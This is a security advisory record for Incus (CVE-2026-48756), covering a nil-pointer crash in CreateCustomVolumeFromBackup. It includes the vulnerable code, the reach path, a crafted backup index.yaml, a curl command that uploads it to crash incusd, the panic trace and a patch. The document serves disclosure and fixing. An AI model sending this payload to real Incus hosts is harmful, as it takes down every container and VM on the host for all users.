@@ -1,0 +1,161 @@
+advisory_id: GHSA-xhqx-mgh3-3h7q
+datasource_id: github_osv/GHSA-xhqx-mgh3-3h7q
+datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/06/GHSA-xhqx-mgh3-3h7q/GHSA-xhqx-mgh3-3h7q.json
+aliases:
+  - CVE-2026-48756
+summary: |
+  Incus: CreateCustomVolumeFromBackup nil-pointer dereference on volume_snapshots[*].expires_at (sibling-field variant of GHSA-r7w7)
+  ## Summary
+
+  `(*backend).CreateCustomVolumeFromBackup` in [`internal/server/storage/backend.go`](https://github.com/lxc/incus/blob/985a1dedf9f3e7ba729c93b654905ed510de25c2/internal/server/storage/backend.go) contains an unguarded `*time.Time` dereference on the `ExpiresAt` field of every volume-snapshot entry in an imported custom-volume backup. An authenticated user with `can_create_storage_volumes` permission on any project can crash the `incusd` daemon by uploading a backup tarball whose `volume_snapshots[*].expires_at` field is absent.
+
+  This is a sibling-field variant of GHSA-r7w7-mmxr-47r9 (CVE-2026-40197). Commit `985a1dedf9f3e7ba729c93b654905ed510de25c2` added `if s == nil` at the top of the loop body, but did not guard the adjacent `*snapshot.ExpiresAt` deref 19 lines later. Every other consumer of `Config.VolumeSnapshots[i].ExpiresAt` in this same file already gates the deref with a nil-check — the asymmetric guard is the bug.
+
+  ## Vulnerable code
+
+  [`internal/server/storage/backend.go`](https://github.com/lxc/incus/blob/985a1dedf9f3e7ba729c93b654905ed510de25c2/internal/server/storage/backend.go), `CreateCustomVolumeFromBackup`:
+
+  ```go
+  // Line 7710-7714 — the parent fix from GHSA-r7w7
+  for _, s := range srcBackup.Config.VolumeSnapshots {
+      if s == nil {
+          return errors.New("Bad snapshot definition found in index")
+      }
+      snapshot := s
+      snapName := snapshot.Name
+      // ...
+      // Line 7731 — UNGUARDED *time.Time deref:
+      err = VolumeDBCreate(b, srcBackup.Project, fullSnapName, snapshot.Description,
+          snapVol.Type(), true, snapVol.Config(), snapshot.CreatedAt,
+          *snapshot.ExpiresAt,   // <-- panics when expires_at omitted in YAML
+          snapVol.ContentType(), true, true)
+  ```
+
+  `ExpiresAt` is declared `*time.Time` (`shared/api/storage_pool_volume_snapshot.go:21,88`). Every other consumer in the same file already uses the safe pattern:
+
+  | Line | Code | Guarded? |
+  |------|------|----------|
+  | 909-910 | `CreateInstanceFromBackup` | YES |
+  | 1134-1135 | refresh path | YES |
+  | 1422-1423 | migration path | YES |
+  | **7731** | **`CreateCustomVolumeFromBackup`** | **NO** |
+
+  ## Reach
+
+  1. Attacker is an authenticated client (TLS cert, OIDC, or unix socket) with the `can_create_storage_volumes` entitlement on any project. Same auth gate as parent GHSA-r7w7.
+  2. `POST /1.0/storage-pools/<pool>/volumes/custom` with `Content-Type: application/octet-stream` and `X-Incus-name: <name>`.
+  3. Body is a tar containing [`backup/index.yaml`](https://github.com/lxc/incus/blob/985a1dedf9f3e7ba729c93b654905ed510de25c2/backup/index.yaml) with `type: custom`, a non-nil `volume:` block, and `volume_snapshots: [{name: snap0}]` (no `expires_at` field).
+  4. `cmd/incusd/storage_volumes.go:storagePoolVolumesPost` -> `backup.GetInfo` parses the yaml -> `pool.CreateCustomVolumeFromBackup` -> the `s == nil` guard at 7712 passes (snapshot pointer is non-nil) -> `*snapshot.ExpiresAt` on line 7731 panics on the nil `*time.Time`.
+  5. No `recover()` is installed in the operation runner, so the panic kills the entire `incusd` process. Repeated POSTs are a persistent denial of service.
+
+  Minimal [`backup/index.yaml`](https://github.com/lxc/incus/blob/985a1dedf9f3e7ba729c93b654905ed510de25c2/backup/index.yaml):
+
+  ```yaml
+  name: poc-vol
+  backend: dir
+  pool: default
+  type: custom
+  optimized: false
+  optimized_header: false
+  snapshots: [snap0]
+  config:
+    volume: {name: poc-vol, type: custom, content_type: filesystem, config: {}}
+    volume_snapshots:
+      - name: snap0
+        description: snap0
+        config: {}
+        # expires_at intentionally omitted
+  ```
+
+  ## Proof of concept (end-to-end against running daemon)
+
+  Bundled in the report: `make_backup.sh` + the resulting 479-byte `poc-vol.tar.gz`.
+
+  Tested against `incus 7.0.0` (zabbly latest GA at time of report; build `1:0~ubuntu24.04~202605201355`) inside a privileged Ubuntu 24.04 container with the default `dir` storage pool.
+
+  ```bash
+  $ curl -s --unix-socket /var/lib/incus/unix.socket -X POST \
+      --data-binary @/tmp/poc-vol.tar.gz \
+      -H 'Content-Type: application/octet-stream' \
+      -H 'X-Incus-name: poc-vol' \
+      http://incus/1.0/storage-pools/default/volumes/custom
+  {"type":"async","status":"Operation created","status_code":100,...}
+
+  $ ps -ef | grep incusd | grep -v grep    # process is GONE
+  ```
+
+  Daemon panic from `/tmp/incus.out`:
+
+  ```
+  panic: runtime error: invalid memory address or nil pointer dereference
+  [signal SIGSEGV: segmentation violation code=0x1 addr=0x0 pc=0x162b938]
+
+  goroutine 422 [running]:
+  github.com/lxc/incus/v7/internal/server/storage.(*backend).CreateCustomVolumeFromBackup(...)
+      /build/incus/internal/server/storage/backend.go:7731 +0xb48
+  main.createStoragePoolVolumeFromBackup.func7(...)
+      /build/incus/cmd/incusd/storage_volumes.go:2915 +0x290
+  github.com/lxc/incus/v7/internal/server/operations.(*Operation).Start.func1(...)
+      /build/incus/internal/server/operations/operations.go:307 +0x2c
+  created by github.com/lxc/incus/v7/internal/server/operations.(*Operation).Start in goroutine 408
+      /build/incus/internal/server/operations/operations.go:306 +0x168
+  ```
+
+  Stack frame [`backend.go:7731`](https://github.com/lxc/incus/blob/985a1dedf9f3e7ba729c93b654905ed510de25c2/backend.go#L7731) is the literal `*snapshot.ExpiresAt` line. Same line in v6.0.x LTS is [`backend.go:7271`](https://github.com/lxc/incus/blob/985a1dedf9f3e7ba729c93b654905ed510de25c2/backend.go#L7271) (also panics; v6.0.x additionally lacks the `s == nil` parent fix so a single nil snapshot pointer also panics there).
+
+  ## Impact
+
+  - **Severity:** denial of service against the entire `incusd` process. Every container / VM / storage operation on the host (and on the cluster member, if clustered) is aborted; subsequent requests fail until an operator restarts the process.
+  - **Privileges required:** any authenticated user with `can_create_storage_volumes` on any project. Not behind the admin tier.
+  - **Network attack surface:** the Incus REST API on `:8443` or the unix socket.
+  - **CWE-476** — Nil-Pointer Dereference. **CVSS estimate:** 6.5 (AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H).
+
+  ## Suggested fix
+
+  Mirror the guard pattern already in use at lines 909-910 / 1134-1135 / 1422-1423:
+
+  ```diff
+  --- a/internal/server/storage/backend.go
+  +++ b/internal/server/storage/backend.go
+  @@ -7728,9 +7728,14 @@ func (b *backend) CreateCustomVolumeFromBackup(...) error {
+           snapVol := b.GetVolume(drivers.VolumeTypeCustom, drivers.ContentType(srcBackup.Config.Volume.ContentType), snapVolStorageName, snapshot.Config)
+
+           // Validate config and create database entry for new storage volume.
+           // Strip unsupported config keys (in case the export was made from a different type of storage pool).
+  -        err = VolumeDBCreate(b, srcBackup.Project, fullSnapName, snapshot.Description, snapVol.Type(), true, snapVol.Config(), snapshot.CreatedAt, *snapshot.ExpiresAt, snapVol.ContentType(), true, true)
+  +        var snapExpiryDate time.Time
+  +        if snapshot.ExpiresAt != nil {
+  +            snapExpiryDate = *snapshot.ExpiresAt
+  +        }
+  +
+  +        err = VolumeDBCreate(b, srcBackup.Project, fullSnapName, snapshot.Description, snapVol.Type(), true, snapVol.Config(), snapshot.CreatedAt, snapExpiryDate, snapVol.ContentType(), true, true)
+           if err != nil {
+               return err
+           }
+  ```
+
+  ## Reporter notes
+
+  Reported via Privately-Reported Vulnerability against `lxc/incus` by tonghuaroot.
+impacted_packages: []
+severities:
+  - score: '2.1'
+    scoring_system: cvssv4
+    scoring_elements: CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N/E:P
+    published_at:
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/06/GHSA-xhqx-mgh3-3h7q/GHSA-xhqx-mgh3-3h7q.json
+  - score: LOW
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at:
+    url:
+weaknesses:
+  - CWE-476
+references:
+  - url: https://github.com/lxc/incus
+    reference_type:
+    reference_id:
+  - url: https://github.com/lxc/incus/security/advisories/GHSA-xhqx-mgh3-3h7q
+    reference_type:
+    reference_id:
+exploits: []
